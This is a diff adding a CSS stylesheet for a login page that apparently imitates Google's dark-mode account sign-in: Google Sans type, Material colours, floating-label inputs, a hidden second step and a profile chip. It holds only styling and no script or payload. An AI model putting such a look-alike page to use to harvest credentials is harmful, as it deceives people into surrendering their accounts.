@@ -1,0 +1,172 @@
+@import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap');
+
+body {
+    background-color: #1f1f1f;
+    color: #e3e3e3;
+    font-family: 'Roboto', sans-serif;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    margin: 0;
+}
+
+.google-sans {
+    font-family: 'Google Sans', sans-serif;
+}
+
+.login-card {
+    background-color: #0b0b0b;
+    border-radius: 28px;
+    max-width: 1040px;
+    width: 95%;
+    min-height: 440px;
+    margin: auto;
+    display: flex;
+    padding: 36px;
+}
+
+/* Floating Label Logic */
+.input-container {
+    position: relative;
+    margin-top: 12px;
+    width: 100%;
+}
+
+.input-outline {
+    border: 1px solid #8e918f;
+    border-radius: 4px;
+    height: 56px;
+    display: flex;
+    align-items: center;
+    padding: 0 16px;
+    transition: border 0.2s, box-shadow 0.2s;
+}
+
+.input-outline:focus-within {
+    border: 2px solid #a8c7fa;
+}
+
+.input-field {
+    background: transparent;
+    border: none;
+    outline: none;
+    color: #e3e3e3;
+    width: 100%;
+    font-size: 16px;
+    padding-top: 4px;
+}
+
+.floating-label {
+    position: absolute;
+    left: 16px;
+    top: 18px;
+    color: #8e918f;
+    font-size: 16px;
+    pointer-events: none;
+    transition: all 0.2s ease;
+    background: #0b0b0b;
+    padding: 0 4px;
+    margin-left: -4px;
+}
+
+.input-field:focus + .floating-label,
+.input-field:not(:placeholder-shown) + .floating-label {
+    top: -10px;
+    left: 12px;
+    font-size: 12px;
+    color: #a8c7fa;
+}
+
+.input-field:not(:focus):not(:placeholder-shown) + .floating-label {
+    color: #8e918f;
+}
+
+/* Buttons */
+.btn-primary {
+    background-color: #a8c7fa;
+    color: #062e6f;
+    font-family: 'Google Sans', sans-serif;
+    font-weight: 500;
+    font-size: 14px;
+    padding: 0 24px;
+    height: 40px;
+    border-radius: 20px;
+    transition: background-color 0.2s;
+}
+
+.btn-primary:hover {
+    background-color: #d3e3fd;
+}
+
+.btn-primary:disabled {
+    background-color: #3c4043;
+    color: #80868b;
+    cursor: not-allowed;
+}
+
+.link-blue {
+    color: #a8c7fa;
+    font-family: 'Google Sans', sans-serif;
+    font-weight: 500;
+    font-size: 14px;
+    cursor: pointer;
+    padding: 8px;
+    margin-left: -8px;
+}
+
+.link-blue:hover {
+    background-color: rgba(168, 199, 250, 0.08);
+    border-radius: 4px;
+}
+
+/* Custom Checkbox */
+.checkbox-row {
+    display: flex;
+    align-items: center;
+    margin-top: 10px;
+    cursor: pointer;
+    user-select: none;
+}
+
+.checkbox-box {
+    width: 18px;
+    height: 18px;
+    border: 2px solid #8e918f;
+    border-radius: 2px;
+    margin-right: 12px;
+    position: relative;
+}
+
+.checkbox-box.checked {
+    background: #a8c7fa;
+    border-color: #a8c7fa;
+}
+
+.checkbox-box.checked::after {
+    content: '';
+    position: absolute;
+    left: 5px;
+    top: 1px;
+    width: 5px;
+    height: 10px;
+    border: solid #062e6f;
+    border-width: 0 2px 2px 0;
+    transform: rotate(45deg);
+}
+
+.hidden-step { display: none; }
+
+.profile-chip {
+    border: 1px solid #444746;
+    border-radius: 20px;
+    padding: 4px 12px 4px 6px;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 16px;
+    cursor: pointer;
+}
+
+.profile-chip:hover {
+    background: rgba(255,255,255,0.05);
+}
